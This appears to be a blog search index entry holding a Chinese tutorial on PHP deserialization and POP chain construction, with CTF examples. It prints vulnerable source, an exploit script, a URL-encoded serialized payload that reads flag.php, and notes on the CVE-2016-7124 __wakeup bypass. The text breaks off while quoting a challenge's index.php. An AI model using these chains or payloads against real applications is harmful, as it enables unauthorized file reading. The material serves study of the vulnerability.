<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP反序列化利用 - POP链构造</title>
      <link href="/2021/05/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-POP%E9%93%BE%E6%9E%84%E9%80%A0/"/>
      <url>/2021/05/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-POP%E9%93%BE%E6%9E%84%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>POP链构造——&gt;&gt;&gt;  什么是反序列化攻击，简单说反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p><h2 id="什么是POP？"><a href="#什么是POP？" class="headerlink" title="什么是POP？"></a>什么是POP？</h2><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到恶意攻击. 而要实现 POP链的恶意构造，我们就必须了解一些常见的魔法函数</p><h2 id="魔法函数介绍"><a href="#魔法函数介绍" class="headerlink" title="魔法函数介绍"></a>魔法函数介绍</h2><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/10/zs7KN.png" data-caption="zs7KN.png"><img src="https://i.imgtg.com/2022/05/10/zs7KN.png" alt="zs7KN.png"></a></p><br><h4 id="反序列化常见的起点"><a href="#反序列化常见的起点" class="headerlink" title="反序列化常见的起点"></a>反序列化常见的起点</h4><ul><li><code>__wakeup</code> 反序列化</li><li><code>__destruct</code> 明确销毁对象或脚本结束时被调用</li><li><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用</li></ul><br><h4 id="反序列化常见的中间跳板"><a href="#反序列化常见的中间跳板" class="headerlink" title="反序列化常见的中间跳板"></a>反序列化常见的中间跳板</h4><ul><li><code>__toString</code> 当一个对象被当做字符串使用</li><li><code>__get</code> 读取不可访问或不存在属性时被调用</li><li><code>__set</code> 当给不可访问或不存在属性赋值时被调用</li><li><code>__isset</code> 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 <code>$this-&gt;$func();</code></li></ul><br><h4 id="反序列化常见终点"><a href="#反序列化常见终点" class="headerlink" title="反序列化常见终点"></a>反序列化常见终点</h4><ul><li><code>__call</code> 调用不可访问或不存在的方法时被调用</li><li><code>call_user_func</code> 一般php代码执行都会选择这里</li><li><code>call_user_func_array</code> 一般php代码执行都会选择这里</li></ul><br><h3 id="关于魔法函数的一些功能"><a href="#关于魔法函数的一些功能" class="headerlink" title="关于魔法函数的一些功能"></a>关于魔法函数的一些功能</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $test;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$test</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了构造函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了折构函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        echo &#x27;调用了醒来函数&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo &#x27;创建对象a&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ABC;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo &#x27;序列化&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//$a_ser = serialize($a);</span></span><br><span class="line"><span class="comment">//echo &#x27;反序列化&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//$a_unser = unserialize($a_ser);</span></span><br><span class="line"><span class="comment">//echo &#x27;对象销毁&lt;br&gt;&#x27;;</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2023/04/11/8BIIq.png" data-caption=""><img src="https://i.imgtg.com/2023/04/11/8BIIq.png"></a></p><p>在php中，当一个程序默认走完代码执行流程时，就会触发销毁这个对象</p><p>（在代码运行完自动释放内存之前由于对象已经没有被任何变量引用所以就自动释放了内存）</p><br><h3 id="POP链构造入门案列"><a href="#POP链构造入门案列" class="headerlink" title="POP链构造入门案列"></a>POP链构造入门案列</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag 在flag.php 里面</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们来分析构造POP链的过程，通过对源码的通看，我们可以很快定位到下面的这一坨，从这一坨可以知道，通过get传参，并反序列化，上面定义了3个类：Show、Test、Read    我们想要通过构造反序列化来读取flag.php，那就需要一些读取文件的函数，那其实我们更想利用到Read这个类里面的功能，来实现读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>切入点:</p><p>为读取flag 文件，首先切入点在于：通过 unserialize 反序列化这个可控的点, 来传入一串特定的序列化的payload ，来触发代码中的魔法函数，从而构建一条pop 链</p></blockquote><ol><li><p>既然是读取文件，首先应考虑的是能够读取文件的函数，从源码中，可知 能够去读取文件的魔法函数有: highlight_file 、file_get_contents、 这两个函数，但是我们第一个能够利用的点是：unserialize , 而 unserialize 能够触发 __wakeup 这个魔法函数，而这个魔法函数又在show 这个类里面，回溯到show 这个类中，__wakeup 这个魔法函数中，很明显，preg_match 这个正则表达式把source 这个在show 类中的对象 当作字符串去正则匹配了，所以此时会触发  __toString 这个魔法函数</p></li><li><p>在 __toString 这个魔法函数中，取show 这个类中的str对象数组中的str 字符 ，用来引用在 source 对象（属性与方法），如果不存在的话，就触发了__get 魔法函数（读取不可访问或不存在的属性时被调用）</p></li><li><p>上面触发了__get 魔法函数，就到 Test 类中的__get 魔法函数了，而在此魔法函数中，首先取 Test 类中对象p的属性和方法，再赋值给 function 变量，最后通过 return $function() 来把它当作函数执行，这里就触发了 __invoke 魔法函数</p></li><li><p>__invoke 魔法函数又在 Read 类中，在__invoke 中，调用了在 Read类中的 file_get 方法</p></li><li><p>在此方法中，value这个形参为可控的，最后能够去调用 file_get_contents 函数去读取文件内容，ps: 只需要将 file_get 方法中的形参改为 我们想要读取的flag.php 文件，就可以去读取到最后的flag了</p></li></ol><h4 id="POP链结构最后的大致流程图为"><a href="#POP链结构最后的大致流程图为" class="headerlink" title="POP链结构最后的大致流程图为:"></a>POP链结构最后的大致流程图为:</h4><p>Unserialize(可控变量)  ——&gt;  __wakeup ——&gt; __toString ——&gt; __get  ——&gt; __invoke ——&gt; 触发Read类中file_get 方法中的 file_get_contents 函数 去读取flag.php</p><h4 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//赋值Test类的对象($t)下的属性p为Read类的对象($r)，触发__invoke魔术方法</span></span><br><span class="line"><span class="variable">$t</span>-&gt;p = <span class="variable">$r</span>; </span><br><span class="line"><span class="comment">//赋值Show类的对象($s)下的str数组的str键的值为 Test类的对象$t ，触发__get魔术方法。</span></span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$t</span>;</span><br><span class="line"><span class="comment">//令Show类的对象($s)下的source属性值为此时上一步已经赋值过的$s对象，从而把对象当作字符串调用触发__tostring</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source = <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">// 这里使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>)));</span><br></pre></td></tr></table></figure><p>得到最后的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Show%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>source%<span class="number">22</span>%<span class="number">3</span>Br%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Read%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>flag.php%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><blockquote><p>在构造的过程中，个人觉得还是要比较清晰的知道要干什么，怎么实现它？，上面的构造涉及到的类还是比较少的，如果涉及的类很多后面就很容易被代码绕晕</p></blockquote><blockquote><p>补充：相关的知识点</p></blockquote><h2 id="PHP反序列化-wakeup-绕过方法漏洞（CVE-2016-7124）"><a href="#PHP反序列化-wakeup-绕过方法漏洞（CVE-2016-7124）" class="headerlink" title="PHP反序列化-__wakeup()绕过方法漏洞（CVE-2016-7124）"></a>PHP反序列化-__wakeup()绕过方法漏洞（CVE-2016-7124）</h2><h3 id="漏洞影响的版本"><a href="#漏洞影响的版本" class="headerlink" title="漏洞影响的版本"></a>漏洞影响的版本</h3><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><br><h3 id="漏洞的利用方法"><a href="#漏洞的利用方法" class="headerlink" title="漏洞的利用方法"></a>漏洞的利用方法</h3><p>若在对象的魔法函数中存在的__wakeup方法，那么之后再调用 unserilize() 方法进行反序列化之前则会先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><br><h3 id="漏洞出现情况"><a href="#漏洞出现情况" class="headerlink" title="漏洞出现情况"></a>漏洞出现情况</h3><ol><li>可以之间或简介控制序列化结果</li><li>__wakeup()函数会强制修改某些内容</li></ol><br><h3 id="看例子-极客大挑战-2019-PHP"><a href="#看例子-极客大挑战-2019-PHP" class="headerlink" title="看例子: [极客大挑战 2019]PHP"></a>看例子: [极客大挑战 2019]PHP</h3><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/11/zYHbG.png" data-caption="zYHbG.png"><img src="https://i.imgtg.com/2022/05/11/zYHbG.png" alt="zYHbG.png"></a></p><blockquote><p>初看什么都没有，通过访问备份路径，得到一个 <a href="http://www.zip，打开分别是：">www.zip，打开分别是：</a> class.php , index.php , flag.php</p></blockquote><p>分别看下这几个文件：</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;/title&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;</span>&gt;</span><br><span class="line">      &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    <span class="comment">#login&#123;   </span></span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: <span class="number">50</span>%;   </span><br><span class="line">        left:<span class="number">50</span>%;   </span><br><span class="line">        margin: -<span class="number">150</span>px <span class="number">0</span> <span class="number">0</span> -<span class="number">150</span>px;   </span><br><span class="line">        width: <span class="number">300</span>px;   </span><br><span class="line">        height: <span class="number">300</span>px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: <span class="number">2</span>em;   </span><br><span class="line">        margin: <span class="number">0.67</span>em <span class="number">0</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">&quot;world&quot;</span>&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;</span>&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: 